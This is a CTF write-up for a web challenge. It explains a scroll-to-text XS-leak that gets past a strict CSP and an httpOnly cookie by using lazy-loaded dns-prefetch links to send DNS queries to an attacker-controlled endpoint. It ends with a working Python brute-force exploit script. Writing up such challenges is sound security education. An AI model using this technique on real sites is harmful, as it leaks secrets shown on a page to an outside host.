---
title: "BackdoorCTF25 - Go Touch Grass"
subtitle: "You need to work hard to touch some grass."
excerpt: "You need to work hard to touch some grass."
date: 2025-12-06
categories: [web]
tags: [xs leak, side-channel]
ctfs: [backdoorctf25]
author_profile: true
sidebar:
  nav: "docs"
header:
  overlay_color: "#000"
---

# Recon

```
.
├── Dockerfile
├── flag.txt
└── main.py
```

```python
from flask import Flask, request, make_response, render_template_string
import os, base64, sys, threading, time, jsonify, nh3
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address


app = Flask(__name__)

PORT = 6005

flag = open('flag.txt').read().strip()
# flag charset is string.ascii_lowercase + string.digits

ALLOWED_TAGS = {
    'a', 'b', 'blockquote', 'br', 'code', 'div', 'em', 
    'h1', 'h2', 'h3', 'i', 'iframe', 'img', 'li', 'link', 
    'ol', 'p', 'pre', 'span', 'strong', 'ul'
}
ALLOWED_ATTRIBUTES = {
    'a': {'href', 'target'},
    'link': {'rel', 'href', 'type', 'as'}, 
    '*': {

        'style','src', 'width', 'height', 'alt', 'title',
        'lang', 'dir', 'loading', 'role', 'aria-label'
    }
}

APP_LIMIT_TIME = 60  
APP_LIMIT_COUNT = 5  


limiter = Limiter(
    get_remote_address,
    app=app,
    storage_uri="memory://" 
)

@app.errorhandler(429)
def ratelimit_handler(e):
    return jsonify({
        "error": f"Too many requests, please try again later. Limit is {APP_LIMIT_COUNT} requests per {APP_LIMIT_TIME} seconds."
    }), 429

template = """<!DOCTYPE html>
<html>
<head>

</head>
<body>
    <div class="head"></div>
    {% if flag %}
        <div class="flag"><h1>{{ flag }}</h1></div>
    {% endif %}
    {% if note %}
        <div class="note">{{ note | safe}}</div>
    {% endif %}
    <script nonce="{{ nonce }}">
        Array.from(document.getElementsByClassName('flag')).forEach(function(element) {
            let text = element.innerText;
            element.innerHTML = '';
            for (let i = 0; i < text.length; i++) {
                let charElem = document.createElement('span');
                charElem.innerText = text[i];
                element.appendChild(charElem);
            }
        });
    </script>
</body>
</html>
"""



@app.route('/', methods=['GET'])
def index():

    _flag = request.cookies.get('flag', None)
    nonce = base64.b64encode(os.urandom(32)).decode('utf-8')
    _note = request.args.get('note', 'Try putting your note with /?note=..')
    clean_note = nh3.clean(
        _note, 
        tags=ALLOWED_TAGS, 
        attributes=ALLOWED_ATTRIBUTES,
    )
    
    rendered = render_template_string(
        template,
        nonce=nonce,
        flag=_flag,
        note=clean_note,
    )
    
    response = make_response(rendered)

    response.headers['Content-Security-Policy'] = (
        f"default-src 'none'; script-src 'nonce-{nonce}'; style-src 'none'; "
        "base-uri 'none'; frame-ancestors 'self'; frame-src 'self'; object-src 'none'; "
    )
    response.headers['Referrer-Policy'] = 'no-referrer'
    response.headers['X-Frame-Options'] = 'SAMEORIGIN'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    
    return response

def admin_visit(raw_data_b64: str):
    try:
    
        try:
            data = base64.b64decode(raw_data_b64.encode('utf-8')).decode('utf-8')
        except Exception as e:
            print(f"[BOT] base64 decode error: {e}", file=sys.stderr)
            return

        url = f"http://127.0.0.1:6005/?note={data}"
        print(f"[BOT] Visiting {url}", file=sys.stderr)

        options = Options()
        options.add_argument("--headless")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-gpu")

        driver = webdriver.Chrome(options=options)

        try:
            
            driver.get("http://127.0.0.1:6005/")
            driver.add_cookie({
                'name': 'flag',
                'value': flag.replace("{", "").replace("}", ""), 
                'path': '/',
                'httpOnly': True,
                'sameSite': 'Strict'
            })

            print(f"[BOT] Now visiting target URL {url}", file=sys.stderr)

           
            driver.set_page_load_timeout(5)
            try:
                driver.get(url)
            except Exception as e:
                print(f"[BOT] error during driver.get: {e}", file=sys.stderr)
            time.sleep(5)
        finally:
            driver.quit()
            print(f"[BOT] Done visiting URL {url}", file=sys.stderr)

    except Exception as e:
        print(f"[BOT] Unexpected bot error: {e}", file=sys.stderr)


@app.route('/bot', methods=['GET'])
@limiter.limit(f"{APP_LIMIT_COUNT} per {APP_LIMIT_TIME} second")
def bot():
    raw_data = request.args.get('note')
    if not raw_data:
        return make_response("Missing ?note parameter\n", 400)

    t = threading.Thread(target=admin_visit, args=(raw_data,))
    t.daemon = True
    t.start()

    return make_response("Admin will visit this URL soon.\n", 202)


if __name__ == '__main__':
    app.run(port=PORT, debug=False, host='0.0.0.0')



```

We have a web application that allows us to upload content using the *note* url param, content that will then be sanitized using `nh3` and finally displayed on the page using a *Jinja2* template. We also have an other url making a bot visite the url with a given note through a headless *Chrome* browser.

> [https://github.com/messense/nh3](https://github.com/messense/nh3)

The flag is located in the cookies of the bot, therefore the only way to retrieve it must be to find a way to extract the flag by telling the bot to visit the website with a malicious note.

# Investigations

### Find a way to extract data from the bot session

The following *HTML* tags and attributes are allowed in the notes by `nh3` (which is up-to-date) : 

```javascript
ALLOWED_TAGS = {
    'a', 'b', 'blockquote', 'br', 'code', 'div', 'em', 
    'h1', 'h2', 'h3', 'i', 'iframe', 'img', 'li', 'link', 
    'ol', 'p', 'pre', 'span', 'strong', 'ul'
}
ALLOWED_ATTRIBUTES = {
    'a': {'href', 'target'},
    'link': {'rel', 'href', 'type', 'as'}, 
    '*': {

        'style','src', 'width', 'height', 'alt', 'title',
        'lang', 'dir', 'loading', 'role', 'aria-label'
    }
}
```

Furthermore, strict *CSPs* make the application even more secure by preventing `CSS leaks` or `XSS` : 

```javascript
response.headers['Content-Security-Policy'] = (
        f"default-src 'none'; script-src 'nonce-{nonce}'; style-src 'none'; "
        "base-uri 'none'; frame-ancestors 'self'; frame-src 'self'; object-src 'none'; "
    )
```

Also, the cookie is `httpOnly` so there is no way to extract it using *javascript*-related attacks :

```javascript
driver.add_cookie({
    'name': 'flag',
    'value': flag.replace("{", "").replace("}", ""), 
    'path': '/',
    'httpOnly': True,
    'sameSite': 'Strict'
})
```

Luckily, the flag is displayed in the *DOM*, thus it cancels the security properties granted by the `httpOnly` attribute since now we just have to find a way to extract parts of the *DOM* to a controlled endpoint. To do so, we can look at the allowed *HTML* tags/attributes and search for any combination that could leak information.

The most interesting one is the `<link>` tag since the `rel` attribute is authorized for it. Because of the *CSPs*, we cannot use the classical `preload`, `prefetch` etc.. as they will be blocked if we attempt to load any resource from an external source.

Still, the `dns-prefetch` relation type is authorized. This type of `<link>` will just issue a *DNS* request and therefore will not fetch any resource ; thus it will not be blocked by the *CSPs* : we found our way to extract information from the bot session.

> For data extraction, we can use [`interactsh`](https://app.interactsh.com/#/).

### Create an oracle

Now, we must create an oracle in order to deduce informations. As any form of *javascript* is prohibited, we must use a side-channel. Knowing the *bot* is visiting the website using a *Chrome* instance, an `XS leak` attack seems to be the most fitted, and more precisely a `Scroll-To-Text XS-Leak`. We will make the *bot* issue *DNS* requests depending on what it sees on the page (which contains the *flag*), thus allowing us to guess the *flag*.

Knowing the flag appears at the very top of the page, we will craft the following type of payload (e.g. here to see if '0' is the first character of the flag) : 

```html
<iframe src="/?note=void" width="100%" height="20000"></iframe>
<iframe src="/?note=<link rel='dns-prefetch' href='//{dns_id}'>" loading="lazy" width="100" height="100"></iframe>
<div>flag0</div>
```

And send it to the following url : `http://<challenge-host>/bot?note={base64_encoded_payload}#:~:text=flag0`

First, we put a *spacer*, that will push our **lazy-loaded** `dns-prefetch` and our guess far at the bottom of the page. Then, the location fragment at the end of the url (`#:~:text=flag0`) will be interpreted by *Chrome* as a "go to text=flag0". Here two scenarios can occur :

- *flag0* is not the beginning of the flag :

*Chrome* will scroll to the bottom of the page, i.e. where the guess we placed is located (`<div>flag0</div>`). This will then trigger the **lazy-loaded** `dns-prefetch` that will then issue a *DNS* request towards our controlled *endpoint*. By including the guess into the *DNS* request, we can then know that this guess is wrong.

- *flag0* is indeed the beginning of the flag :

*Chrome* will locate it on the displayed elements, therefore there will be no *DNS* request.

### Side-channel exploitation

Now we have our oracle, we can create the script and guess the flag : 

```python
import requests
import urllib.parse
import time
import string
import base64

BASE_URL = "http://<challenge-host>"
BOT_URL = f"{BASE_URL}/bot"
DOMAIN = "<data-extraction-endpoint>"

KNOWN_FLAG = "flag"
CHARSET = string.ascii_lowercase + string.digits

def create_payload(char, prefix):
    decoy_text = f"{prefix}{char}"
    
    spacer = '<iframe src="/?note=void" width="100%" height="20000"></iframe>'

    dns_id = f"NOT-{char}.{DOMAIN}"
    probe = f'<link rel="dns-prefetch" href="//{dns_id}">'
    probe_enc = urllib.parse.quote(probe)
    trigger = f'<iframe src="/?note={probe_enc}" loading="lazy" width="100" height="100"></iframe>'
    
    decoy = f"<div>{decoy_text}</div>"
    
    return spacer + trigger + decoy

print(f"[*] Current flag : {KNOWN_FLAG}")

while True:
 
    for char in CHARSET:
        payload_html = create_payload(char, KNOWN_FLAG)
        payload_param = urllib.parse.quote(payload_html)
        
        fragment = f"{KNOWN_FLAG}{char}"

        raw_data = f"{payload_param}#:~:text={fragment}"

        print(raw_data)

        b64_data = base64.b64encode(raw_data.encode()).decode()
        
        print(f"   Testing '{char}' -> Fragment: {fragment} ...", end='')
        
        try:
            r = requests.get(BOT_URL, params={'note': b64_data})
            
            if r.status_code == 429:
                print(" RATE LIMIT (65s pause)")
                time.sleep(65)
                requests.get(BOT_URL, params={'note': b64_data})
            elif r.status_code != 202:
                print(f" Error {r.status_code}")
                
        except Exception as e:
            print(f" Exception: {e}")
            
        print(" OK")
        time.sleep(13)
```

This takes time as we are limited to 5 requests per minute (1 char every 13 seconds), and the charset is 36-characters long (ASCII lowercase + digits), but in the end we are able to retrieve the full flag :

> flag{5n34kydn5f3tch}
